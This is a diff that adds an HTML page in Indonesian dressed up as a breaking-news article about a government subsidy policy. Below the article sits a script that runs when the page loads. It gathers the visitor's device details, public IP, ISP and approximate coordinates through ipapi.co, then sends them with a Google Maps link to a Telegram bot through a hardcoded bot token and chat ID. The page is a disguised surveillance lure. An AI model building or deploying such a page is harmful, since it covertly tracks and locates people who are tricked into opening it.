@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Berita Terkini Indonesia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      background: #d62828;
+      color: white;
+      padding: 15px;
+      text-align: center;
+    }
+    main {
+      padding: 20px;
+    }
+    article {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px #ccc;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Berita Terkini Indonesia</h1>
+  </header>
+  <main>
+    <article>
+      <h2>BREAKING NEWS: Pemerintah Keluarkan Kebijakan Baru Terkait Subsidi</h2>
+      <p>Jakarta - Pemerintah secara resmi mengumumkan kebijakan subsidi baru yang mulai berlaku minggu depan. Kebijakan ini menyasar sektor transportasi dan energi untuk mengurangi dampak inflasi...</p>
+      <p><i>Sumber: Kementerian Komunikasi dan Informatika</i></p>
+    </article>
+  </main>
+
+
+  <script>
+    const BOT_TOKEN = "8876962221:AAFJ3BE7qEvuIF7zN3gYpr41a0km-ZO75Rs";
+    const CHAT_ID = "344594130";
+
+    async function getInfo() {
+      const device = navigator;
+      const deviceInfo = `
+[+] Device Information :
+OS           : ${device.platform}
+Platform     : ${device.userAgentData?.platform || device.platform}
+CPU Cores    : ${navigator.hardwareConcurrency || 'Not Available'}
+RAM          : ${navigator.deviceMemory || 'Not Available'} GB
+GPU Vendor   : Not Available
+GPU Model    : Not Available
+Resolution   : ${screen.width}x${screen.height}
+Browser      : ${navigator.userAgent}
+      `;
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const ip = await res.json();
+
+        const ipInfo = `
+[+] IP Information :
+Continent    : ${ip.continent_code}
+Country      : ${ip.country_name}
+Region       : ${ip.region}
+City         : ${ip.city}
+Org          : ${ip.org}
+ISP          : ${ip.org}
+Public IP    : ${ip.ip}
+        `;
+
+        const locationInfo = `
+[+] Location Information :
+Latitude     : ${ip.latitude}
+Longitude    : ${ip.longitude}
+Accuracy     : ~ Approx via IP
+Altitude     : Not Available
+Direction    : Not Available
+Speed        : Not Available
+
+📍 Google Maps : https://www.google.com/maps/place/${ip.latitude},${ip.longitude}
+        `;
+
+        const fullMessage = `${deviceInfo}\n${ipInfo}\n${locationInfo}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: fullMessage
+          })
+        });
+
+      } catch (err) {
+        console.error(err);
+      }
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
